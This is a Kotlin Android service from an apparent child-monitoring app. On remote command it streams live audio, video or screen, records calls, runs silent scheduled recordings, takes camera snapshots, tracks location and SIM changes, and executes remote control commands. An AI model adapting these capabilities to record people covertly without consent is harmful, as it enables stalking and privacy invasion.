package com.example.authapp.service

import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import com.example.authapp.analytics.AppHealthTelemetry
import com.example.authapp.data.AppPreferences
import com.example.authapp.data.FirebaseRepository
import com.example.authapp.ui.activity.ScreenCapturePromptActivity
import com.google.firebase.crashlytics.FirebaseCrashlytics
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel

class ChildForegroundService : Service() {

    private val mainHandler = Handler(Looper.getMainLooper())
    private val serviceJob = SupervisorJob()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)

    private lateinit var overlayManager: ChildOverlayWindowManager
    private lateinit var notificationHelper: ChildServiceNotificationHelper
    private lateinit var locationHelper: ChildLocationMonitorHelper
    private lateinit var simNetworkMonitor: ChildSimAndNetworkMonitor
    private lateinit var deviceStateMonitor: ChildDeviceStateMonitor
    private lateinit var snapshotHandler: ChildSnapshotHandler
    private lateinit var callRecordingHandler: ChildCallRecordingHandler
    private lateinit var streamCoordinator: ChildStreamCoordinator
    private lateinit var streamRequestListener: ChildStreamRequestListener
    private var currentServiceState = "IDLE_PROTECTED"
    private var scheduledStopRunnable: Runnable? = null

    companion object {
        const val CHANNEL_ID = "ChildStreamChannel"
        const val NOTIFICATION_ID = 1001
        const val ACTION_START_MONITORING = "ACTION_START_MONITORING"
        const val ACTION_START = "ACTION_START_STREAM"
        const val ACTION_START_SCREEN_STREAM = "ACTION_START_SCREEN_STREAM"
        const val ACTION_STOP = "ACTION_STOP_SERVICE"
        const val ACTION_STOP_STREAM = "ACTION_STOP_STREAM_ONLY"
        const val ACTION_START_CALL_RECORDING = "ACTION_START_CALL_RECORDING"
        const val ACTION_STOP_CALL_RECORDING = "ACTION_STOP_CALL_RECORDING"
        const val ACTION_SCHEDULED_RECORDING = "ACTION_SCHEDULED_RECORDING"
        const val ACTION_TAKE_SNAPSHOT = "ACTION_TAKE_SNAPSHOT"
        const val ACTION_EXECUTE_COMMAND = "ACTION_EXECUTE_COMMAND"
        const val EXTRA_STREAM_TYPE = "EXTRA_STREAM_TYPE"
        const val EXTRA_SESSION_ID = "EXTRA_SESSION_ID"
        const val EXTRA_PHONE_NUMBER = "EXTRA_PHONE_NUMBER"
        const val EXTRA_CAMERA_FACING = "EXTRA_CAMERA_FACING"
        const val EXTRA_COMMAND = "EXTRA_COMMAND"
        const val EXTRA_COMMAND_VALUE = "EXTRA_COMMAND_VALUE"
    }

    override fun onCreate() {
        super.onCreate()
        overlayManager = ChildOverlayWindowManager(this, mainHandler)
        notificationHelper = ChildServiceNotificationHelper(this)
        simNetworkMonitor = ChildSimAndNetworkMonitor(this)
        deviceStateMonitor = ChildDeviceStateMonitor(this)
        snapshotHandler = ChildSnapshotHandler(this)
        callRecordingHandler = ChildCallRecordingHandler(this)
        streamCoordinator = ChildStreamCoordinator(this)

        locationHelper = ChildLocationMonitorHelper(this, mainHandler, { simNetworkMonitor.isNetworkConnected() }, { streamRequestListener.activeGeofences })
        streamRequestListener = ChildStreamRequestListener(this, streamCoordinator, snapshotHandler, overlayManager, notificationHelper, deviceStateMonitor)

        notificationHelper.createNotificationChannel()
        notificationHelper.startHeartbeatTimer({ streamCoordinator.isStreaming }, { currentServiceState })
        simNetworkMonitor.startNetworkRestoreSync()
        simNetworkMonitor.startSimMonitoring()
    }

    private fun setServiceState(state: String, title: String, serviceType: Int) {
        currentServiceState = state
        AppHealthTelemetry.syncDeviceHealth(applicationContext, state)
        notificationHelper.updateForegroundNotification(title, serviceType)
    }

    private fun startMonitoringStreamRequests() {
        val uid = FirebaseRepository.currentUser?.uid?.takeIf { it.isNotEmpty() }
            ?: AppPreferences.getUserId(applicationContext).takeIf { it.isNotEmpty() }

        if (uid.isNullOrEmpty()) {
            FirebaseCrashlytics.getInstance().log("[ChildService] User signed out or not found. Stopping background service.")
            stopStream()
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
            return
        }

        locationHelper.startLocationMonitoring()
        deviceStateMonitor.registerMediaObserver(uid, serviceScope, mainHandler)
        deviceStateMonitor.registerTelephonyCallStateListener(uid, mainExecutor)
        deviceStateMonitor.startPermissionShieldGuard(
            uid = uid,
            hasOverlay = { overlayManager.hasOverlayPermission() },
            hasLoc = { notificationHelper.hasLocationPermission() },
            hasMic = { notificationHelper.hasMicrophonePermission() },
            hasCam = { notificationHelper.hasCameraPermission() }
        )

        streamRequestListener.startMonitoring(
            uid = uid,
            serviceScope = serviceScope,
            onStartWebRtc = { sessionId, streamType -> startWebRtcStream(sessionId, streamType) },
            onStopStream = { stopStream() }
        )
    }

    private fun startWebRtcStream(sessionId: String, streamType: String, projectionData: Intent? = null) {
        // Strict safety timeout watchdog powered dynamically by Firebase Remote Config
        val timeoutMinutes = com.example.authapp.config.RemoteConfigManager.getStreamTimeoutMinutes()
        scheduledStopRunnable?.let { mainHandler.removeCallbacks(it) }
        scheduledStopRunnable = Runnable {
            FirebaseCrashlytics.getInstance().log("[ChildService] $timeoutMinutes-minute RemoteConfig auto-timeout watchdog stopping stream")
            stopStream()
        }
        mainHandler.postDelayed(scheduledStopRunnable!!, timeoutMinutes * 60 * 1000L)

        streamCoordinator.startWebRtcStream(
            sessionId = sessionId,
            streamType = streamType,
            projectionData = projectionData,
            onEnsureOverlay = { overlayManager.ensureOverlayWindow() },
            onAcquireWakeLock = { notificationHelper.acquireWakeLock() },
            onReleaseWakeLock = { notificationHelper.releaseWakeLock() },
            onRemoveOverlay = { overlayManager.removeOverlayWindow() }
        )
    }

    private fun stopStream() {
        scheduledStopRunnable?.let { mainHandler.removeCallbacks(it) }
        scheduledStopRunnable = null
        streamCoordinator.stopStream(
            onReleaseWakeLock = { notificationHelper.releaseWakeLock() },
            onRemoveOverlay = { overlayManager.removeOverlayWindow() }
        )
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START_SCREEN_STREAM -> {
                val sessionId = intent.getStringExtra(EXTRA_SESSION_ID) ?: streamCoordinator.currentSessionId ?: ""
                val mediaProjectionData = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    intent.getParcelableExtra("MEDIA_PROJECTION_DATA", Intent::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    intent.getParcelableExtra<Intent>("MEDIA_PROJECTION_DATA")
                }
                setServiceState("STREAMING_SCREEN", "Live Screen Sharing Active", notificationHelper.getStreamingServiceType("screen"))
                startWebRtcStream(sessionId, "screen", mediaProjectionData)
            }
            ACTION_START -> {
                val streamType = intent.getStringExtra(EXTRA_STREAM_TYPE) ?: "audio"
                val sessionId = intent.getStringExtra(EXTRA_SESSION_ID) ?: ""
                val durationMinutes = intent.getIntExtra("duration_minutes", 0)

                if (streamCoordinator.isDuplicateStreamRequest(sessionId)) return START_STICKY

                scheduledStopRunnable?.let { mainHandler.removeCallbacks(it) }
                val maxMinutes = if (durationMinutes > 0) durationMinutes.toLong() else com.example.authapp.config.RemoteConfigManager.getStreamTimeoutMinutes()
                scheduledStopRunnable = Runnable {
                    FirebaseCrashlytics.getInstance().log("[ChildService] Stream auto-stopping after $maxMinutes min safety timeout")
                    stopStream()
                }
                scheduledStopRunnable?.let { mainHandler.postDelayed(it, maxMinutes * 60 * 1000L) }

                val isVideo = streamType.equals("video", ignoreCase = true) || streamType.equals("camera_video", ignoreCase = true)
                if (isVideo && !com.example.authapp.config.RemoteConfigManager.isLiveVideoEnabled()) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] Live video is disabled via RemoteConfig")
                    return START_STICKY
                }
                val isScreen = streamType.equals("screen", ignoreCase = true) || streamType.equals("screen_mirror", ignoreCase = true)
                if (isScreen && !com.example.authapp.config.RemoteConfigManager.isLiveScreenEnabled()) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] Live screen is disabled via RemoteConfig")
                    return START_STICKY
                }
                if (isVideo) {
                    overlayManager.ensureOverlayWindow()
                }
                val serviceType = notificationHelper.getStreamingServiceType(streamType)
                val st = if (isVideo) "STREAMING_VIDEO" else "STREAMING_AUDIO"
                setServiceState(st, "Active Remote Stream ($streamType)", serviceType)

                if (streamType.equals("screen", ignoreCase = true) || streamType.equals("screen_mirror", ignoreCase = true)) {
                    val promptIntent = Intent(this, ScreenCapturePromptActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        putExtra(EXTRA_SESSION_ID, sessionId)
                    }
                    startActivity(promptIntent)
                } else {
                    startWebRtcStream(sessionId, streamType)
                }
            }
            ACTION_START_MONITORING -> {
                setServiceState("IDLE_PROTECTED", "Background Protection Active", notificationHelper.getIdleServiceType())
                startMonitoringStreamRequests()
            }
            ACTION_SCHEDULED_RECORDING -> {
                val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                callRecordingHandler.startScheduledRecording(
                    intent = intent,
                    uid = uid,
                    mainHandler = mainHandler,
                    onEnsureOverlay = { overlayManager.ensureOverlayWindow() },
                    onRemoveOverlay = { overlayManager.removeOverlayWindow() },
                    onStartRecording = { isVideo, durationMinutes ->
                        startMonitoringStreamRequests()
                        val serviceType = if (isVideo) notificationHelper.getStreamingServiceType("video") else notificationHelper.getStreamingServiceType("audio")
                        setServiceState("RECORDING_SCHEDULED", "Silent Scheduled Recording (${if (isVideo) "Video" else "Audio"}, $durationMinutes min)", serviceType)
                        notificationHelper.acquireWakeLock()
                    },
                    onStopRecording = {
                        if (!streamCoordinator.isStreaming) notificationHelper.releaseWakeLock()
                        setServiceState("IDLE_PROTECTED", "Background Protection Active", notificationHelper.getIdleServiceType())
                    }
                )
            }
            ACTION_START_CALL_RECORDING -> {
                val phoneNumber = intent.getStringExtra(EXTRA_PHONE_NUMBER) ?: "unknown"
                setServiceState("RECORDING_CALL", "Recording Active Call", notificationHelper.getStreamingServiceType("audio"))
                notificationHelper.acquireWakeLock()
                callRecordingHandler.startCallRecording(phoneNumber) {}
            }
            ACTION_STOP_CALL_RECORDING -> {
                val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                callRecordingHandler.stopCallRecording(uid) {
                    if (!streamCoordinator.isStreaming) notificationHelper.releaseWakeLock()
                    setServiceState("IDLE_PROTECTED", "Background Protection Active", notificationHelper.getIdleServiceType())
                }
            }
            ACTION_STOP_STREAM -> {
                stopStream()
                streamCoordinator.streamAudioRecorder?.stopRecording()
                setServiceState("IDLE_PROTECTED", "Background Protection Active", notificationHelper.getIdleServiceType())
            }
            ACTION_TAKE_SNAPSHOT -> {
                val facing = intent.getStringExtra(EXTRA_CAMERA_FACING) ?: "back"
                val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                startMonitoringStreamRequests()
                snapshotHandler.takeSnapshot(
                    uid = uid,
                    cameraFacing = facing,
                    onStartCapture = {
                        overlayManager.ensureOverlayWindow()
                        notificationHelper.updateForegroundNotification("Capturing Remote Photo", notificationHelper.getSnapshotServiceType())
                    },
                    onFinishCapture = { setServiceState("IDLE_PROTECTED", "Background Protection Active", notificationHelper.getIdleServiceType()) }
                )
            }
            ACTION_EXECUTE_COMMAND -> {
                val cmd = intent.getStringExtra(EXTRA_COMMAND) ?: ""
                val value = intent.getStringExtra(EXTRA_COMMAND_VALUE) ?: "true"
                setServiceState("IDLE_PROTECTED", "Background Protection Active", notificationHelper.getIdleServiceType())
                startMonitoringStreamRequests()
                ChildRemoteCommandHandler.executeRemoteControlCommand(
                    context = this,
                    coroutineScope = serviceScope,
                    uid = AppHealthTelemetry.getEffectiveUserId(applicationContext),
                    command = cmd,
                    value = value,
                    onSyncInstalledApps = { deviceStateMonitor.syncInstalledApps(it) }
                )
            }
            ACTION_STOP -> {
                currentServiceState = "STOPPED"
                AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                stopStream()
                callRecordingHandler.stopAll(mainHandler)
                streamCoordinator.streamAudioRecorder?.stopRecording()
                stopForeground(STOP_FOREGROUND_REMOVE)
                stopSelf()
            }
            else -> {
                val effectiveUid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                if (FirebaseRepository.currentUser == null && effectiveUid.isEmpty()) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] No user logged in. Terminating service.")
                    stopStream()
                    stopForeground(STOP_FOREGROUND_REMOVE)
                    stopSelf()
                    return START_NOT_STICKY
                }
                setServiceState("IDLE_PROTECTED", "Background Protection Active", notificationHelper.getIdleServiceType())
                startMonitoringStreamRequests()
            }
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        stopStream()
        callRecordingHandler.stopAll(mainHandler)
        locationHelper.stopLocationMonitoring()
        simNetworkMonitor.cleanup()
        deviceStateMonitor.cleanup()
        overlayManager.removeAllOverlays()
        streamRequestListener.stopMonitoring()
        notificationHelper.releaseWakeLock()
        notificationHelper.stopHeartbeatTimer()
        serviceScope.cancel()
    }
}
